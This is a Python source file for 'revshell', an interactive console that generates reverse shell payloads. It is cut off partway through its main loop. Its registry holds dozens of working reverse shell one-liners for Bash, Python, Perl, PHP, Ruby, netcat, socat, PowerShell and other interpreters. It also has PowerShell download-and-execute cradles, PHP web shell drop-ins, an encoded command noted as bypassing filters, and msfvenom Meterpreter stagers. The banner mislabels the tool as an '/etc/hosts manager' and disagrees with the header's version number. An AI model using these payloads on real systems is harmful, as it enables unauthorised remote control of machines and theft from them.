#!/usr/bin/env python3
"""
revshell — Reverse Shell Generator Console
Author  : @ZetaOrioniss
Version : v2.0
"""

import sys
import os
import shlex
import readline
import subprocess
import shutil
import socket
import struct
import json
import re
import base64
from dataclasses import dataclass, field
from typing import Optional


# ─────────────────────────────────────────────────────────────────────────────
#  Color / Style primitives
# ─────────────────────────────────────────────────────────────────────────────

class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    MAGENTA= "\033[95m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    GREY   = "\033[90m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    ITALIC = "\033[3m"
    UNDER  = "\033[4m"
    END    = "\033[0m"

    @staticmethod
    def r(s):  return f"{C.RED}{s}{C.END}"
    @staticmethod
    def g(s):  return f"{C.GREEN}{s}{C.END}"
    @staticmethod
    def y(s):  return f"{C.YELLOW}{s}{C.END}"
    @staticmethod
    def b(s):  return f"{C.BLUE}{s}{C.END}"
    @staticmethod
    def m(s):  return f"{C.MAGENTA}{s}{C.END}"
    @staticmethod
    def c(s):  return f"{C.CYAN}{s}{C.END}"
    @staticmethod
    def w(s):  return f"{C.WHITE}{s}{C.END}"
    @staticmethod
    def grey(s): return f"{C.GREY}{s}{C.END}"
    @staticmethod
    def bold(s): return f"{C.BOLD}{s}{C.END}"
    @staticmethod
    def dim(s):  return f"{C.DIM}{s}{C.END}"
    @staticmethod
    def ul(s):   return f"{C.UNDER}{s}{C.END}"
    @staticmethod
    def it(s):   return f"{C.ITALIC}{s}{C.END}"


# ─────────────────────────────────────────────────────────────────────────────
#  Payload model
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class Payload:
    key:      str
    name:     str
    platform: str           # unix | windows | both
    category: str           # bash | python | perl | php | ruby | netcat | socat | powershell | meterpreter | other
    template: str
    note:     str = ""      # optional short note

    def render(self, lhost: str, lport: str) -> str:
        return self.template.format(lhost=lhost, lport=lport)


# ─────────────────────────────────────────────────────────────────────────────
#  Payload registry
# ─────────────────────────────────────────────────────────────────────────────

PAYLOADS: list[Payload] = [

    # ── Bash ──────────────────────────────────────────────────────────────────
    Payload("bash_tcp", "Bash TCP", "unix", "bash",
        "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "Classic one-liner"),
    Payload("bash_196", "Bash FD 196", "unix", "bash",
        "0<&196;exec 196<>/dev/tcp/{lhost}/{lport};sh <&196 >&196 2>&196",
        "Uses file descriptor 196"),
    Payload("bash_udp", "Bash UDP", "unix", "bash",
        "bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
        "UDP variant"),
    Payload("bash_read", "Bash read loop", "unix", "bash",
        "exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done",
        "Read-loop variant"),
    Payload("sh_tcp", "sh TCP", "unix", "bash",
        "sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
    Payload("zsh_tcp", "Zsh TCP", "unix", "bash",
        "zsh -c 'zmodload zsh/net/tcp && ztcp {lhost} {lport} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
        "Requires zsh with net/tcp module"),

    # ── Python ────────────────────────────────────────────────────────────────
    Payload("python3_pty", "Python3 PTY", "unix", "python",
        "python3 -c 'import socket,os,pty;"
        "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "pty.spawn(\"/bin/bash\")'",
        "Spawns a PTY"),
    Payload("python3_env", "Python3 environ", "unix", "python",
        "export RHOST=\"{lhost}\";export RPORT={lport};"
        "python3 -c 'import sys,socket,os,pty;"
        "s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));"
        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
        "Env-var variant (avoids logging IP in bash history)"),
    Payload("python3_thread", "Python3 threaded", "unix", "python",
        "python3 -c 'import socket,subprocess,os,threading;"
        "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "t=lambda f,t:[threading.Thread(target=lambda:os.write(t,os.read(f,4096)),daemon=True).start() for _ in iter(int,1)];"
        "p=subprocess.Popen([\"/bin/sh\"],stdin=s,stdout=s,stderr=s)'"),
    Payload("python2", "Python2", "unix", "python",
        "python -c 'import socket,os,pty;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "pty.spawn(\"/bin/bash\")'"),
    Payload("python_win", "Python Windows", "windows", "python",
        "python -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{lhost}\",{lport}));"
        "subprocess.call([\"cmd.exe\"],stdin=s,stdout=s,stderr=s)'",
        "Windows cmd shell via Python"),

    # ── Perl ──────────────────────────────────────────────────────────────────
    Payload("perl", "Perl", "unix", "perl",
        "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){{" 
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        "exec(\"/bin/sh -i\");}};'"),
    Payload("perl_no_sh", "Perl no /bin/sh", "unix", "perl",
        "perl -MIO -e '$p=fork;exit,if($p);"
        "$c=new IO::Socket::INET(PeerAddr,\"{lhost}:{lport}\");"
        "STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>'",
        "Avoids direct /bin/sh call"),
    Payload("perl_win", "Perl Windows", "windows", "perl",
        "perl -MIO::Socket -e "
        "'$c=IO::Socket::INET->new(PeerAddr=>\"{lhost}:{lport}\");"
        "open STDIN,\"<&\",$c;open STDOUT,\">&\",$c;open STDERR,\">&\",$c;"
        "exec \"cmd.exe\"'"),

    # ── PHP ───────────────────────────────────────────────────────────────────
    Payload("php_exec", "PHP exec", "unix", "php",
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    Payload("php_proc_open", "PHP proc_open", "unix", "php",
        "php -r '$d=array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\",\"w\"));"
        "$p=proc_open(\"/bin/bash\",$d,$pp);"
        "$s=fsockopen(\"{lhost}\",{lport});"
        "while(!feof($s)){{$c=fread($s,4096);fwrite($pp[0],$c);}}'",
        "Uses proc_open for better shell handling"),
    Payload("php_shell_exec", "PHP shell_exec", "unix", "php",
        "php -r '$s=fsockopen(\"{lhost}\",{lport});$cmd=\"/bin/sh -i\";"
        "shell_exec($cmd.\" <&3 >&3 2>&3\");'"),
    Payload("php_system", "PHP system()", "unix", "php",
        "<?php system(\"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>",
        "Web shell drop-in"),
    Payload("php_passthru", "PHP passthru()", "unix", "php",
        "<?php passthru(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f\"); ?>",
        "mkfifo via PHP web shell"),
    Payload("php_win", "PHP Windows", "windows", "php",
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
        "exec(\"cmd.exe /c powershell -NoP -NonI -Exec Bypass \");'"),

    # ── Ruby ──────────────────────────────────────────────────────────────────
    Payload("ruby", "Ruby", "unix", "ruby",
        "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
        "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
    Payload("ruby_no_sh", "Ruby no /bin/sh", "unix", "ruby",
        "ruby -rsocket -e 'exit if fork;"
        "c=TCPSocket.new(\"{lhost}\",\"{lport}\");"
        "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        "Avoids direct /bin/sh, uses IO.popen"),
    Payload("ruby_win", "Ruby Windows", "windows", "ruby",
        "ruby -rsocket -e 'c=TCPSocket.new(\"{lhost}\",\"{lport}\");"
        "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"),

    # ── Netcat ────────────────────────────────────────────────────────────────
    Payload("nc_e", "Netcat -e", "unix", "netcat",
        "nc -e /bin/sh {lhost} {lport}",
        "Requires -e flag (traditional nc)"),
    Payload("nc_mkfifo", "Netcat mkfifo", "unix", "netcat",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "Works with OpenBSD nc (no -e)"),
    Payload("nc_ncat", "Ncat", "unix", "netcat",
        "ncat {lhost} {lport} -e /bin/bash",
        "Nmap's ncat"),
    Payload("nc_udp", "Netcat UDP", "unix", "netcat",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u {lhost} {lport} >/tmp/f",
        "UDP variant with mkfifo"),
    Payload("busybox_nc", "BusyBox nc", "unix", "netcat",
        "busybox nc {lhost} {lport} -e /bin/sh",
        "Embedded/IoT targets"),

    # ── Socat ─────────────────────────────────────────────────────────────────
    Payload("socat", "Socat", "unix", "socat",
        "socat tcp-connect:{lhost}:{lport} exec:'bash -li',pty,stderr,setsid,sigint,sane",
        "Full PTY — best interactive shell"),
    Payload("socat_tty", "Socat encrypted", "unix", "socat",
        "socat openssl-connect:{lhost}:{lport},verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane",
        "TLS-encrypted; listener needs: socat openssl-listen:<port>,cert=..."),
    Payload("socat_udp", "Socat UDP", "unix", "socat",
        "socat UDP:{lhost}:{lport} exec:'bash -li',pty,stderr,setsid,sigint,sane"),

    # ── AWK / other Unix tools ─────────────────────────────────────────────────
    Payload("awk", "AWK", "unix", "other",
        "awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do {{"
        "printf \"shell>\" |& s; s |& getline c; if (c) {{"
        "while ((c |& getline) > 0) print $0 |& s; close(c); }} }}"
        "while(c != \"exit\") }}}}'"),
    Payload("gawk", "GNU Awk", "unix", "other",
        "gawk 'BEGIN{{s=\"/inet/tcp/0/{lhost}/{lport}\";"
        "for(;;){{printf \"sh>\" |& s;if((s |& getline c)<=0)break;"
        "while((\"exec \"c |& getline o)>0)print o |& s;close(\"exec \"c)}}}}'"),
    Payload("telnet", "Telnet mkfifo", "unix", "other",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet {lhost} {lport} >/tmp/f",
        "For hosts with telnet but no nc"),
    Payload("lua", "Lua", "unix", "other",
        "lua -e \"require('socket');"
        "t=require('socket').tcp();"
        "t:connect('{lhost}','{lport}');"
        "while true do local r=t:receive();local f=io.popen(r,'r');"
        "local s=f:read('*a');f:close();t:send(s) end;t:close()\""),
    Payload("golang", "Go", "unix", "other",
        "echo 'package main;import(\"os/exec\";\"net\");func main(){{c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/rs.go && go run /tmp/rs.go",
        "Needs Go installed; drops temp file"),
    Payload("java_runtime", "Java Runtime", "unix", "other",
        "r = Runtime.getRuntime();"
        "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);"
        "p.waitFor()",
        "Groovy / Java console"),
    Payload("node_js", "Node.js", "unix", "other",
        "require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')",
        "One-liner for Node REPL/RCE"),

    # ── PowerShell ────────────────────────────────────────────────────────────
    Payload("powershell", "PowerShell TCP", "windows", "powershell",
        "$c=New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        "$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";"
        "$by=([text.encoding]::ASCII).GetBytes($sb2);"
        "$s.Write($by,0,$by.Length);$s.Flush()}}$c.Close()",
        "Full interactive PS reverse shell"),
    Payload("ps_oneliner", "PowerShell one-liner", "windows", "powershell",
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
        "\"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$s.Write(([text.encoding]::ASCII).GetBytes((iex $d 2>&1|Out-String)+(pwd).Path+'> '),0,(iex ...).Length);$s.Flush()}}\""),
    Payload("ps_b64", "PowerShell Base64", "windows", "powershell",
        "powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBsAGgAbwBzAHQAfQAiACwAIAB7AGwAcABvAHIAdAB9ACkA",
        "Obfuscated — bypasses basic filters"),
    Payload("ps_icm", "PowerShell ICM", "windows", "powershell",
        "IEX(New-Object Net.WebClient).downloadString('http://{lhost}/rs.ps1')",
        "Download & execute — host a ps1 payload"),
    Payload("ps_nishang", "Nishang Invoke-PowerShellTcp", "windows", "powershell",
        "IEX(New-Object Net.WebClient).downloadString('http://{lhost}/Invoke-PowerShellTcp.ps1');"
        "Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}",
        "Requires Nishang hosted on lhost"),
    Payload("cmd_nc", "cmd.exe + nc", "windows", "powershell",
        "nc.exe -e cmd.exe {lhost} {lport}",
        "If nc.exe is available on target"),

    # ── Meterpreter stagers ───────────────────────────────────────────────────
    Payload("msf_linux_x64", "MSF Linux x64", "unix", "meterpreter",
        "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf",
        "Generate + exec — requires msfvenom"),
    Payload("msf_win_x64", "MSF Windows x64", "windows", "meterpreter",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe",
        "Generate exe stager"),
    Payload("msf_ps_stager", "MSF PS stager", "windows", "meterpreter",
        "msfvenom -p cmd/windows/reverse_powershell LHOST={lhost} LPORT={lport}",
        "Powershell stager via msfvenom"),
    Payload("msf_handler", "MSF handler", "both", "meterpreter",
        "msfconsole -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'",
        "Quick handler — change payload as needed"),
]

PAYLOAD_MAP: dict[str, Payload] = {p.key: p for p in PAYLOADS}

# Ordered categories for grouped display
CATEGORIES = ["bash", "python", "perl", "php", "ruby", "netcat", "socat", "other", "powershell", "meterpreter"]
CATEGORY_LABELS = {
    "bash":       "Bash / Shell",
    "python":     "Python",
    "perl":       "Perl",
    "php":        "PHP",
    "ruby":       "Ruby",
    "netcat":     "Netcat / BusyBox",
    "socat":      "Socat",
    "other":      "Other (Lua, Go, Java, Node…)",
    "powershell": "PowerShell / Windows",
    "meterpreter":"Metasploit Stagers",
}

PLATFORM_ICON = {"unix": "🐧", "windows": "🪟", "both": "🌐"}
NC_CANDIDATES = ["nc", "ncat", "netcat"]


# ─────────────────────────────────────────────────────────────────────────────
#  Network interface helpers
# ─────────────────────────────────────────────────────────────────────────────

def get_interfaces() -> dict[str, str]:
    ifaces: dict[str, str] = {}

    try:
        import fcntl
        SIOCGIFADDR = 0x8915
        for _, name in socket.if_nameindex():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                packed = fcntl.ioctl(s.fileno(), SIOCGIFADDR,
                                     struct.pack("256s", name[:15].encode()))
                ip = socket.inet_ntoa(packed[20:24])
                s.close()
                if not ip.startswith("127."):
                    ifaces[name] = ip
            except Exception:
                pass
        if ifaces:
            return ifaces
    except Exception:
        pass

    try:
        out = subprocess.check_output(["ip", "-4", "addr", "show"],
                                      stderr=subprocess.DEVNULL, text=True)
        cur = None
        for line in out.splitlines():
            line = line.strip()
            if line and line[0].isdigit():
                cur = line.split(":")[1].strip().split("@")[0]
            elif line.startswith("inet ") and cur:
                ip = line.split()[1].split("/")[0]
                if not ip.startswith("127."):
                    ifaces[cur] = ip
        if ifaces:
            return ifaces
    except Exception:
        pass

    try:
        out = subprocess.check_output(["ifconfig"],
                                      stderr=subprocess.DEVNULL, text=True)
        cur = None
        for line in out.splitlines():
            if line and not line[0].isspace():
                cur = line.split(":")[0].split()[0]
            if "inet " in line and cur:
                parts = line.strip().split()
                for i, p in enumerate(parts):
                    if p in ("inet", "addr:"):
                        ip = parts[i + 1].replace("addr:", "")
                        if not ip.startswith("127."):
                            ifaces[cur] = ip
                        break
        if ifaces:
            return ifaces
    except Exception:
        pass

    return ifaces


def resolve_iface_ip(name: str) -> Optional[str]:
    return get_interfaces().get(name)


def is_interface_name(value: str) -> bool:
    return not bool(re.match(r"^\d{1,3}(\.\d{1,3}){3}$", value))


def print_interfaces(highlight: Optional[str] = None) -> None:
    ifaces = get_interfaces()
    W = 54
    print(f"\n  {C.grey('─' * W)}")
    print(f"  {C.bold('  INTERFACE'):<30}{C.bold('IPv4')}")
    print(f"  {C.grey('─' * W)}")
    if not ifaces:
        print(f"  {C.r('  No interfaces found.')}")
    for name, ip in ifaces.items():
        is_hl = highlight and name == highlight
        marker = f"  {C.y('◀')}" if is_hl else ""
        name_s = C.bold(C.g(name)) if is_hl else C.g(name)
        ip_s   = C.bold(C.c(ip))   if is_hl else ip
        name_pad = 28 + (len(C.GREEN)+len(C.END)) + (len(C.BOLD) if is_hl else 0)
        print(f"  {name_s:<{name_pad}}{ip_s}{marker}")
    print(f"  {C.grey('─' * W)}\n")


def interactive_iface_picker(session: "Session") -> None:
    ifaces = get_interfaces()
    if not ifaces:
        print(f"  {C.r('No interfaces found.')}")
        return
    entries = list(ifaces.items())
    W = 54
    print(f"\n  {C.grey('─' * W)}")
    print(f"  {C.bold('  #'):<8}{C.bold('INTERFACE'):<22}{C.bold('IPv4')}")
    print(f"  {C.grey('─' * W)}")
    for i, (name, ip) in enumerate(entries, 1):
        print(f"  {C.grey(str(i)):<{6+len(C.GREY)+len(C.END)}}{C.g(name):<{22+len(C.GREEN)+len(C.END)}}{ip}")
    print(f"  {C.grey('─' * W)}")
    print(f"  {C.grey('Number or name (empty to cancel):')}")
    try:
        choice = input(f"  {C.bold(C.GREEN)}>{C.END} ").strip()
    except (KeyboardInterrupt, EOFError):
        print()
        return
    if not choice:
        print(C.grey("  Cancelled."))
        return
    if choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(entries):
            name, ip = entries[idx]
        else:
            print(C.r(f"  Invalid number: {choice}"))
            return
    elif choice in ifaces:
        name, ip = choice, ifaces[choice]
    else:
        print(C.r(f"  Unknown interface: '{choice}'"))
        return
    session.lhost = ip
    change_config(host=ip)
    print(f"\n  LHOST  {C.grey('=>')}  {C.bold(C.g(ip))}  {C.grey('(' + name + ')')}\n")


# ─────────────────────────────────────────────────────────────────────────────
#  Session
# ─────────────────────────────────────────────────────────────────────────────

class Session:
    def __init__(self):
        self.lhost: Optional[str] = None
        self.lport: Optional[str] = None

    def set(self, key: str, value: str) -> tuple[bool, Optional[str]]:
        k = key.lower()
        if k in ("ip", "lhost", "host"):
            if is_interface_name(value):
                ip = resolve_iface_ip(value)
                if ip is None:
                    return False, None
                self.lhost = ip
                return True, ip
            else:
                self.lhost = value
                return True, None
        if k in ("port", "lport"):
            self.lport = value
            return True, None
        return False, None

    def render_lhost(self) -> str:
        return self.lhost if self.lhost else C.r("<LHOST>")

    def render_lport(self) -> str:
        return self.lport if self.lport else C.r("<LPORT>")


# ─────────────────────────────────────────────────────────────────────────────
#  Listener
# ─────────────────────────────────────────────────────────────────────────────

def find_nc() -> Optional[tuple[str, str]]:
    for binary in NC_CANDIDATES:
        path = shutil.which(binary)
        if path:
            return binary, path
    return None


def start_listener(port: str, use_rlwrap: bool = False) -> None:
    result = find_nc()
    if result is None:
        print(f"\n  {C.r('Netcat not found.')}  sudo apt install netcat-openbsd\n")
        return
    binary, path = result
    cmd = [binary, "-lvnp", port]
    if use_rlwrap:
        if not shutil.which("rlwrap"):
            print(f"  {C.y('rlwrap not found — falling back to plain netcat.')}")
        else:
            cmd = ["rlwrap"] + cmd
    print(f"\n  {C.grey('─' * 60)}")
    print(f"  {C.bold('Listener')}   {C.g(' '.join(cmd))}")
    print(f"  {C.grey(f'Binary: {path}')}")
    print(f"  {C.grey('Waiting on port')} {C.g(port)} {C.grey('  Ctrl+C to stop')}")
    print(f"  {C.grey('─' * 60)}\n")
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(f"\n  {C.grey('Listener stopped.')}\n")
    except FileNotFoundError:
        print(C.r(f"  Could not execute '{cmd[0]}'."))


# ─────────────────────────────────────────────────────────────────────────────
#  Shell execution
# ─────────────────────────────────────────────────────────────────────────────

def run_shell_command(raw_cmd: str) -> None:
    """Execute a native shell command and stream output."""
    print(f"\n  {C.grey('─' * 60)}")
    try:
        result = subprocess.run(
            raw_cmd, shell=True, text=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        if result.stdout:
            for line in result.stdout.splitlines():
                print(f"  {line}")
        if result.stderr:
            for line in result.stderr.splitlines():
                print(f"  {C.grey(line)}")
        if result.returncode != 0:
            print(f"\n  {C.grey('Exit code:')} {C.y(str(result.returncode))}")
    except Exception as e:
        print(f"  {C.r(str(e))}")
    print(f"  {C.grey('─' * 60)}\n")


# ─────────────────────────────────────────────────────────────────────────────
#  Config persistence
# ─────────────────────────────────────────────────────────────────────────────

def load_config() -> dict:
    try:
        with open("conf.json") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"param": {"host": "", "port": ""}}


def change_config(host: Optional[str] = None, port: Optional[str] = None) -> None:
    config = load_config()
    if "param" not in config:
        config["param"] = {}
    if host is not None:
        config["param"]["host"] = host
    if port is not None:
        config["param"]["port"] = port
    try:
        with open("conf.json", "w") as f:
            json.dump(config, f, indent=4)
    except IOError as e:
        print(C.r(f"  Failed to write config: {e}"))


# ─────────────────────────────────────────────────────────────────────────────
#  UI strings
# ─────────────────────────────────────────────────────────────────────────────

BANNER = f"""
{C.WHITE}
╔══════════════════════════════════════════════════════════════╗
║                          RevShell                            ║
╚══════════════════════════════════════════════════════════════╝
{C.END}{C.DIM}
  /etc/hosts manager console{C.END}
{C.END}{C.DIM}  Author: {C.BOLD}{C.RED}@ZetaOrioniss{C.END}
{C.END}{C.DIM}  Version: {C.BOLD}{C.RED}v1.2{C.END}
{C.DIM}
{C.DIM}  Type {C.END}{C.BOLD}help{C.END}{C.DIM} to list available commands.{C.END}
"""

HELP = f"""
  {C.bold('CONFIGURATION')}
  {C.g('load config')}            Load LHOST/LPORT from conf.json
  {C.g('set ip <addr|iface>')}    Set LHOST — IP address or interface name
  {C.g('set port <port>')}        Set LPORT
  {C.g('unset ip|port')}          Clear a value
  {C.g('show options')}           Print current LHOST / LPORT

  {C.bold('NETWORK')}
  {C.g('ifconfig')}               List IPv4 interfaces
  {C.g('ifconfig pick')}          Interactive picker → sets LHOST

  {C.bold('PAYLOADS')}
  {C.g('show')}                   List all payloads with keys
  {C.g('show <category>')}        Filter by category (bash/python/php…)
  {C.g('use <key>')}              Print a single payload
  {C.g('run')}                    Print all payloads (current config)
  {C.g('run <key>')}              Print one payload by key
  {C.g('run --unix')}             Filter: Unix platforms only
  {C.g('run --windows')}          Filter: Windows platforms only
  {C.g('run --cat <name>')}       Filter: by category name

  {C.bold('LISTENER')}
  {C.g('listener')}               Start  nc -lvnp <LPORT>
  {C.g('rlwrap')}                 Start listener with rlwrap (better TTY)

  {C.bold('SHELL (native commands)')}
  {C.g('! <command>')}            Execute a native system command
  {C.g('shell')}                  Drop into interactive /bin/bash

  {C.bold('OTHER')}
  {C.g('clear')}                  Clear screen
  {C.g('help')}                   Show this help
  {C.g('exit')} / {C.g('quit')}           Exit
"""


# ─────────────────────────────────────────────────────────────────────────────
#  Display helpers
# ─────────────────────────────────────────────────────────────────────────────

def _render_cmd(p: Payload, session: Session) -> str:
    lhost = session.render_lhost()
    lport = session.render_lport()
    return p.render(lhost, lport)


def print_all_payloads(session: Session,
                       platform_filter: Optional[str] = None,
                       cat_filter: Optional[str] = None) -> None:
    W = 110
    title = f" {session.lhost or 'LHOST'}:{session.lport or 'LPORT'} "
    print(f"\n  {C.bold(C.WHITE + title.center(W - 2) + C.END)}")
    print(f"  {C.grey('═' * W)}")

    for cat in CATEGORIES:
        if cat_filter and cat != cat_filter:
            continue
        bucket = [p for p in PAYLOADS if p.category == cat
                  and (platform_filter is None or p.platform in (platform_filter, "both"))]
        if not bucket:
            continue

        label = CATEGORY_LABELS.get(cat, cat.upper())
        print(f"\n  {C.bold(C.CYAN + '  ' + label.upper() + C.END)}")
        print(f"  {C.grey('·' * W)}")

        for p in bucket:
            icon = PLATFORM_ICON.get(p.platform, "")
            cmd  = _render_cmd(p, session)
            note = f"  {C.grey(p.note)}" if p.note else ""
            key_col = C.grey(f"[{p.key}]")
            name_col = C.bold(p.name)
            print(f"  {name_col}  {key_col}  {icon}{note}")
            print(f"  {C.GREEN}{cmd}{C.END}")
            print(f"  {C.grey('·' * W)}")

    print(f"  {C.grey('═' * W)}\n")


def print_single_payload(p: Payload, session: Session) -> None:
    cmd  = _render_cmd(p, session)
    icon = PLATFORM_ICON.get(p.platform, "")
    W    = 80

    print(f"\n  {C.grey('─' * W)}")
    print(f"  {C.bold(C.WHITE)}{icon} {p.name}{C.END}  {C.grey(p.key)}  {C.grey('(' + p.platform + '/' + p.category + ')')}")
    if p.note:
        print(f"  {C.grey(p.note)}")
    print(f"  {C.grey('─' * W)}")
    print(f"\n  {C.GREEN}{cmd}{C.END}\n")
    if session.lport:
        print(f"  {C.grey('Listener:')}  nc -lvnp {session.lport}")
    print(f"\n  {C.grey('─' * W)}\n")


def print_payload_list(cat_filter: Optional[str] = None) -> None:
    W = 70
    print(f"\n  {C.grey('─' * W)}")
    print(f"  {C.bold('  KEY'):<{28+len(C.BOLD)+len(C.END)}}{C.bold('NAME'):<22}{C.bold('OS'):<14}{C.bold('CATEGORY')}")
    print(f"  {C.grey('─' * W)}")
    last_cat = None
    for p in PAYLOADS:
        if cat_filter and p.category != cat_filter:
            continue
        if p.category != last_cat:
            last_cat = p.category
            label = CATEGORY_LABELS.get(p.category, p.category)
            print(f"\n  {C.bold(C.CYAN + '  ' + label + C.END)}")
        icon = PLATFORM_ICON.get(p.platform, "")
        print(f"  {C.g(p.key):<{26+len(C.GREEN)+len(C.END)}}{p.name:<22}{icon + ' ' + p.platform:<14}")
    print(f"\n  {C.grey('─' * W)}\n")


# ─────────────────────────────────────────────────────────────────────────────
#  Tab completion
# ─────────────────────────────────────────────────────────────────────────────

COMMANDS  = ["load", "set", "unset", "use", "run", "generate", "show",
             "ifconfig", "interfaces", "listener", "rlwrap", "clear",
             "help", "exit", "quit", "shell", "!"]
SET_KEYS  = ["ip", "port", "lhost", "lport", "host"]
SHOW_OPTS = ["payloads", "options"] + CATEGORIES
SHELL_KEYS = [p.key for p in PAYLOADS]


def _iface_names() -> list[str]:
    try:
        return list(get_interfaces().keys())
    except Exception:
        return []


def completer(text: str, state: int):
    line  = readline.get_line_buffer().lstrip()
    parts = line.split()
    n     = len(parts)

    if n == 0 or (n == 1 and not line.endswith(" ")):
        opts = [c for c in COMMANDS if c.startswith(text)]
    elif parts[0] == "set" and n <= 2:
        opts = [k for k in SET_KEYS if k.startswith(text)]
    elif parts[0] == "set" and n == 3 and parts[1].lower() in ("ip","host","lhost"):
        opts = [x for x in _iface_names() if x.startswith(text)]
    elif parts[0] in ("use", "run") and n <= 2:
        opts = [k for k in SHELL_KEYS if k.startswith(text)]
    elif parts[0] == "show" and n <= 2:
        opts = [o for o in SHOW_OPTS if o.startswith(text)]
    elif parts[0] == "unset" and n <= 2:
        opts = [k for k in ("ip","port") if k.startswith(text)]
    elif parts[0] in ("ifconfig","interfaces") and n <= 2:
        opts = [o for o in ("pick",)+tuple(_iface_names()) if o.startswith(text)]
    else:
        opts = []

    return opts[state] if state < len(opts) else None


readline.set_completer(completer)
readline.parse_and_bind("tab: complete")


# ─────────────────────────────────────────────────────────────────────────────
#  Prompt
# ─────────────────────────────────────────────────────────────────────────────

def prompt(session: Session) -> str:
    h = session.lhost or C.grey("-")
    p = session.lport or C.grey("-")
    return f"{C.BOLD}{C.RED}revshell{C.END} {C.grey(f'({h}:{p})')} {C.BOLD}{C.GREEN}›{C.END} "


# ─────────────────────────────────────────────────────────────────────────────
#  Main loop
# ─────────────────────────────────────────────────────────────────────────────

def run_console() -> None:
    print(BANNER)
    session = Session()

    while True:
        try:
            raw = input(prompt(session)).strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n  {C.grey('Goodbye.')}\n")
            break

        if not raw:
            continue

        # ── Native shell command via ! prefix ─────────────────────────────
        if raw.startswith("!"):
            cmd_str = raw[1:].strip()
            if cmd_str:
                run_shell_command(cmd_str)
            else:
